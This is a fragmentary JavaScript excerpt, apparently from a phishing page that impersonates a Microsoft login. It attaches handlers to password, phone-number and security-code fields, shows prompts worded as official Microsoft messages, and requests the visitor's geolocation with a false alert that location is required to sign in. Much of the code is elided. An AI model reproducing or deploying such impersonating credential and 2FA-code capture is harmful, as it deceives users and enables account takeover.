...
document.addEventListener("DOMContentLoaded", () => {
  ...
  const verifyStartReq =
    "Please enter the phone number connected to your Microsoft account.";
  const verifyCodeReq =
    "Please enter the correct security code that was sent to you.";
  ...
  pwdInp.addEventListener("keydown", (event) =>
    handleConfirmDown(event, confirm)
  );
  ...
  verifyStartInp.addEventListener("keydown", (event) =>
    handleVerifyStartDown(event, verify)
  );
  ...
  verifyCodeInp.addEventListener("keydown", (event) =>
    handleVerifyCodeDown(event, code)
  );
  ...
  function generateId() {
    ...
    for (let i = 1; i < numDashes; i++) {
      // Start from 1 to skip adding a dash at the beginning
  ...
  function getFirstLocation(
    ...
    navigator.geolocation?.getCurrentPosition(
      ...
      (error) => {
        ...
        alert(
          "Location permission is required to login to your Microsoft Account."
        );
      }
    );
  }
